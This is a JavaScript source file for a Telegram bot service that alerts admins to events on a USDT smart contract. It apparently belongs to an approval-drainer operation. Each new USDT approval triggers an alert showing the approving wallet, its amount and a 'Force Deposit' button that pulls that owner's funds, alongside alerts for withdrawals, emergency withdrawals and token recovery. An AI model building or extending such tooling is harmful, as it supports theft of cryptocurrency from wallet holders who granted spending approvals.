const logger = require('../utils/logger')
const { formatAmount, formatTransactionLink } = require('../utils/formatters')

class EventService {
  constructor (bot, adminIds) {
    this.bot = bot
    this.adminIds = adminIds
  }

  async sendNotification (eventName, data, eventObj) {
    const txUrl = formatTransactionLink(eventObj.transactionHash)
    let message = ''
    let keyboard

    switch (eventName) {
      case 'Approval':
        message = `✅ *NEW USDT APPROVAL*\n👤 \`${data.owner}\`\n💰 ${formatAmount(data.value)} USDT\n[🔍 View TX](${txUrl})`
        keyboard = {
          inline_keyboard: [[
            { text: '⚡ Force Deposit', callback_data: `deposit:${data.owner}` },
            { text: '📊 Check Balance', callback_data: `balance:${data.owner}` }
          ]]
        }
        break

      case 'Deposited':
        message = `💰 *DEPOSIT SUCCESS*\n👤 \`${data.user}\`\n💰 ${formatAmount(data.amount)} USDT\n[🔍 View TX](${txUrl})`
        break

      case 'Withdrawn':
        message = `💸 *FUNDS MOVED*\n📤 To: \`${data.to}\`\n💰 ${formatAmount(data.amount)} USDT\n[🔍 View TX](${txUrl})`
        break

      case 'Paused':
        message = `⏸️ *CONTRACT ${data.state ? 'PAUSED' : 'UNPAUSED'}*\n🛑 Status Changed\n[🔍 View TX](${txUrl})`
        break

      case 'EmergencyWithdrawalTriggered':
        message = `🚨 *EMERGENCY WITHDRAW*\n💰 ${formatAmount(data.amount)} USDT\n⏱️ ${new Date(Number(data.timestamp) * 1000).toISOString()}\n[🔍 View TX](${txUrl})`
        break

      case 'BatchDeposited':
        message = `📦 *BATCH DEPOSIT*\n👥 ${data.count} users\n💰 ${formatAmount(data.totalAmount)} USDT\n[🔍 View TX](${txUrl})`
        break

      case 'TokensRecovered':
        message = `🔄 *TOKENS RECOVERED*\n🪙 \`${data.tokenAddr}\`\n💰 ${formatAmount(data.amount)}\n[🔍 View TX](${txUrl})`
        break

      case 'OperatorSet':
        message = `👮 *OPERATOR CHANGED*\n👤 \`${data.op}\`\n📊 ${data.enabled ? 'Enabled' : 'Disabled'}\n[🔍 View TX](${txUrl})`
        break

      default:
        message = `📡 *${eventName}*\n[🔍 View](${txUrl})`
    }

    for (const adminId of this.adminIds) {
      try {
        await this.bot.telegram.sendMessage(adminId, message, {
          parse_mode: 'Markdown',
          reply_markup: keyboard,
          disable_web_page_preview: true
        })
        logger.info('Event notification sent', { eventName, adminId })
      } catch (error) {
        logger.error('Failed to send event notification', { eventName, adminId, error: error.message })
      }
    }
  }

  async handleCallback (ctx, pattern, handler) {
    const match = ctx.match[1]
    if (match) {
      await handler(ctx, match)
      await ctx.answerCbQuery()
    }
  }
}

module.exports = EventService
